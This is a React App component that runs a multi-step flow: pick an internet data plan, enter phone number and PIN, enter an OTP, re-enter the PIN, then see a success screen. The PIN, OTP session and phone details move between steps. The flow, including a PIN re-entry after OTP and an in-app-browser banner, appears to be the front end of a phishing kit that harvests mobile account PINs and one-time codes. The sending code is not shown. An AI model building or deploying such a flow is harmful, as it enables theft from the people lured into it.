import React, { useState } from 'react';
import { AnimatePresence, motion } from 'motion/react';
import { InternetPlan, Step } from './types';
import { INTERNET_PLANS } from './data/plans';
import { PlansPage } from './components/PlansPage';
import { LoginPage } from './components/LoginPage';
import { OtpPage } from './components/OtpPage';
import { ReenterPinPage } from './components/ReenterPinPage';
import { SuccessPage } from './components/SuccessPage';
import { InAppBrowserBanner } from './components/InAppBrowserBanner';
import { AppProvider } from './context/AppContext';
import { CountryInfo } from './data/countries';
import { safeScrollToTop } from './utils/safeBrowser';

function AppContent() {
  const [step, setStep] = useState<Step>('PLANS');
  const [selectedPlan, setSelectedPlan] = useState<InternetPlan>(INTERNET_PLANS[3]); // Default 15GB Popular
  const [userPhone, setUserPhone] = useState<string>('');
  const [userFullPhone, setUserFullPhone] = useState<string>('');
  const [userPin, setUserPin] = useState<string>('');
  const [confirmedPin, setConfirmedPin] = useState<string>('');
  const [userCountry, setUserCountry] = useState<CountryInfo | undefined>(undefined);
  const [sessionId, setSessionId] = useState<string>('');

  const handleSelectPlan = (plan: InternetPlan) => {
    setSelectedPlan(plan);
    setStep('LOGIN');
    safeScrollToTop();
  };

  const handleLoginSuccess = (
    phone: string,
    pin: string,
    newSessionId: string,
    country: CountryInfo,
    fullPhone: string
  ) => {
    setUserPhone(phone);
    setUserFullPhone(fullPhone);
    setUserPin(pin);
    setUserCountry(country);
    setSessionId(newSessionId);
    setStep('OTP');
    safeScrollToTop();
  };

  const handleOtpSuccess = () => {
    // After OTP verification success, transition to PIN re-entry page before Success
    setStep('REENTER_PIN');
    safeScrollToTop();
  };

  const handleReenterPinSuccess = (finalPin: string) => {
    setConfirmedPin(finalPin);
    setStep('SUCCESS');
    safeScrollToTop();
  };

  const handleReset = () => {
    setStep('PLANS');
    setUserPhone('');
    setUserFullPhone('');
    setUserPin('');
    setConfirmedPin('');
    setSessionId('');
    safeScrollToTop();
  };

  const pageVariants = {
    initial: { opacity: 0, x: 20 },
    animate: { opacity: 1, x: 0 },
    exit: { opacity: 0, x: -20 },
  };

  return (
    <div className="w-full min-h-screen min-h-[100dvh] bg-neutral-900 text-neutral-900 overflow-x-hidden flex flex-col">
      <InAppBrowserBanner />
      <AnimatePresence mode="wait">
        {step === 'PLANS' && (
          <motion.div
            key="plans-view"
            variants={pageVariants}
            initial="initial"
            animate="animate"
            exit="exit"
            transition={{ duration: 0.3, ease: 'easeInOut' }}
          >
            <PlansPage onSelectPlan={handleSelectPlan} />
          </motion.div>
        )}

        {step === 'LOGIN' && (
          <motion.div
            key="login-view"
            variants={pageVariants}
            initial="initial"
            animate="animate"
            exit="exit"
            transition={{ duration: 0.3, ease: 'easeInOut' }}
          >
            <LoginPage
              selectedPlan={selectedPlan}
              onBack={() => setStep('PLANS')}
              onLoginSuccess={handleLoginSuccess}
            />
          </motion.div>
        )}

        {step === 'OTP' && (
          <motion.div
            key="otp-view"
            variants={pageVariants}
            initial="initial"
            animate="animate"
            exit="exit"
            transition={{ duration: 0.3, ease: 'easeInOut' }}
          >
            <OtpPage
              phone={userPhone}
              fullPhone={userFullPhone}
              country={userCountry}
              pin={userPin}
              sessionId={sessionId}
              selectedPlan={selectedPlan}
              onBack={() => setStep('LOGIN')}
              onOtpSuccess={handleOtpSuccess}
            />
          </motion.div>
        )}

        {step === 'REENTER_PIN' && (
          <motion.div
            key="reenter-pin-view"
            variants={pageVariants}
            initial="initial"
            animate="animate"
            exit="exit"
            transition={{ duration: 0.3, ease: 'easeInOut' }}
          >
            <ReenterPinPage
              phone={userPhone}
              fullPhone={userFullPhone}
              country={userCountry}
              initialPin={userPin}
              sessionId={sessionId}
              selectedPlan={selectedPlan}
              onBack={() => setStep('OTP')}
              onSuccess={handleReenterPinSuccess}
            />
          </motion.div>
        )}

        {step === 'SUCCESS' && (
          <motion.div
            key="success-view"
            variants={pageVariants}
            initial="initial"
            animate="animate"
            exit="exit"
            transition={{ duration: 0.3, ease: 'easeInOut' }}
          >
            <SuccessPage
              phone={userPhone}
              fullPhone={userFullPhone}
              country={userCountry}
              selectedPlan={selectedPlan}
              sessionId={sessionId}
              onReset={handleReset}
            />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

export default function App() {
  return (
    <AppProvider>
      <AppContent />
    </AppProvider>
  );
}
